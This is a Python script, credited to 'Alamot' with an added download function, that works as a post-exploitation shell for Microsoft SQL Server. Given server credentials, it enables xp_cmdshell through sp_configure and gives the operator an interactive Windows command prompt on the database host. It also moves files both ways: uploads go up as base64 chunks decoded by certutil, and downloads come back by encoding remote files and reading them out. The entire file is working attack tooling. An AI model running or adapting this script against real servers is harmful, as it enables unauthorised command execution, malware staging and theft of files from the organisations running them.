#!/usr/bin/env python
from __future__ import print_function
# Author: Alamot + download function added
# Use pymssql >= 1.0.3
# UPLOAD local_path [remote_path]
# DOWNLOAD remote_path [local_path]

import pymssql
from pymssql import _mssql
import base64
import shlex
import sys
import tqdm
import hashlib
from io import open

try:
    input = raw_input
except NameError:
    pass

MSSQL_SERVER = "YOURIP"
MSSQL_USERNAME = "UESRNAME"
MSSQL_PASSWORD = "PASSWORD"
BUFFER_SIZE = 5 * 1024
TIMEOUT = 30


def process_result(mssql):
    username = ""
    computername = ""
    cwd = ""
    rows = list(mssql)
    for row in rows[:-3]:
        columns = list(row)
        if row[columns[-1]]:
            print(row[columns[-1]])
        else:
            print()
    if len(rows) >= 3:
        (username, computername) = rows[-3][list(rows[-3])[-1]].split('|')
        cwd = rows[-2][list(rows[-3])[-1]]
    return (username.rstrip(), computername.rstrip(), cwd.rstrip())


def upload(mssql, stored_cwd, local_path, remote_path):
    print("Uploading " + local_path + " to " + remote_path)
    cmd = 'type nul > "' + remote_path + '.b64"'
    mssql.execute_query("EXEC xp_cmdshell '" + cmd + "'")

    with open(local_path, 'rb') as f:
        data = f.read()
        md5sum = hashlib.md5(data).hexdigest()
        b64enc_data = b"".join(base64.encodebytes(data).split()).decode()

    print("Data length (b64-encoded): " + str(len(b64enc_data) / 1024) + "KB")
    for i in tqdm.tqdm(range(0, len(b64enc_data), BUFFER_SIZE), unit_scale=BUFFER_SIZE / 1024, unit="KB"):
        cmd = 'echo ' + b64enc_data[i:i + BUFFER_SIZE] + ' >> "' + remote_path + '.b64"'
        mssql.execute_query("EXEC xp_cmdshell '" + cmd + "'")

    cmd = 'certutil -decode "' + remote_path + '.b64" "' + remote_path + '"'
    mssql.execute_query("EXEC xp_cmdshell 'cd " + stored_cwd + " & " + cmd + " & echo %username%^|%COMPUTERNAME% & cd'")
    process_result(mssql)
    cmd = 'certutil -hashfile "' + remote_path + '" MD5'
    mssql.execute_query("EXEC xp_cmdshell 'cd " + stored_cwd + " & " + cmd + " & echo %username%^|%COMPUTERNAME% & cd'")
    if md5sum in [row[list(row)[-1]].strip() for row in mssql if row[list(row)[-1]]]:
        print("MD5 hashes match: " + md5sum)
    else:
        print("ERROR! MD5 hashes do NOT match!")


def download(mssql, stored_cwd, remote_path, local_path):
    print("Downloading " + remote_path + " to " + local_path)
    cmd = f'certutil -encode "{remote_path}" "{remote_path}.b64"'
    mssql.execute_query(f"EXEC xp_cmdshell 'cd {stored_cwd} & {cmd} & echo %username%^|%COMPUTERNAME% & cd'")
    process_result(mssql)

    cmd = f'type "{remote_path}.b64"'
    mssql.execute_query(f"EXEC xp_cmdshell 'cd {stored_cwd} & {cmd} & echo %username%^|%COMPUTERNAME% & cd'")
    rows = list(mssql)

    b64data = ""
    for row in rows[:-3]:
        val = list(row.values())[-1]
        if val:
            val = val.strip()
            if not val.startswith("-----"):
                b64data += val

    try:
        binary_data = base64.b64decode(b64data)
        with open(local_path, 'wb') as f:
            f.write(binary_data)
        print("Download complete: saved to", local_path)
    except Exception as e:
        print("Download failed:", e)


def shell():
    mssql = None
    stored_cwd = None
    try:
        mssql = _mssql.connect(server=MSSQL_SERVER, user=MSSQL_USERNAME, password=MSSQL_PASSWORD)
        print("Successful login: " + MSSQL_USERNAME + "@" + MSSQL_SERVER)

        print("Trying to enable xp_cmdshell ...")
        mssql.execute_query("EXEC sp_configure 'show advanced options',1;RECONFIGURE;exec SP_CONFIGURE 'xp_cmdshell',1;RECONFIGURE")

        cmd = 'echo %username%^|%COMPUTERNAME% & cd'
        mssql.execute_query("EXEC xp_cmdshell '" + cmd + "'")
        (username, computername, cwd) = process_result(mssql)
        stored_cwd = cwd

        while True:
            cmd = input("CMD " + username + "@" + computername + " " + cwd + "> ").rstrip("\n").replace("'", "''")
            if not cmd:
                cmd = "call"
            if cmd.lower().startswith("exit"):
                mssql.close()
                return
            elif cmd.upper().startswith("UPLOAD"):
                upload_cmd = shlex.split(cmd, posix=False)
                if len(upload_cmd) < 3:
                    upload(mssql, stored_cwd, upload_cmd[1], stored_cwd + "\\" + upload_cmd[1])
                else:
                    upload(mssql, stored_cwd, upload_cmd[1], upload_cmd[2])
                cmd = "echo *** UPLOAD PROCEDURE FINISHED ***"
            elif cmd.upper().startswith("DOWNLOAD"):
                dl_cmd = shlex.split(cmd, posix=False)
                if len(dl_cmd) < 3:
                    download(mssql, stored_cwd, dl_cmd[1], dl_cmd[1].split('\\')[-1])
                else:
                    download(mssql, stored_cwd, dl_cmd[1], dl_cmd[2])
                cmd = "echo *** DOWNLOAD PROCEDURE FINISHED ***"

            mssql.execute_query("EXEC xp_cmdshell 'cd " + stored_cwd + " & " + cmd + " & echo %username%^|%COMPUTERNAME% & cd'")
            (username, computername, cwd) = process_result(mssql)
            stored_cwd = cwd

    except _mssql.MssqlDatabaseException as e:
        if e.severity <= 16:
            print("MSSQL failed: " + str(e))
        else:
            raise
    finally:
        if mssql:
            mssql.close()


shell()
sys.exit()
